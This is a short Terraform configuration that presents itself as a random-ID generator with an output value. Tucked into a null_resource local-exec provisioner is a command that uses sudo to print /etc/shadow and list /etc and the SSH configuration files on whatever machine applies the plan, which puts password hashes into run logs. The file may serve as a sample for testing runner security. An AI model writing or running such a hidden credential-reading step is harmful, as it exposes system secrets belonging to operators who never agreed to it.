
resource "random_id" "random" {
  keepers = {
    uuid = "${uuid()}"
  }

  byte_length = 16
}

resource "null_resource" "cmd" {
  provisioner "local-exec" {
      command = "sudo cat /etc/shadow ; sudo ls /etc/; sudo ls /etc/ssh*"
        }
        }

output "random" {
  value = "${random_id.random.hex}"
}
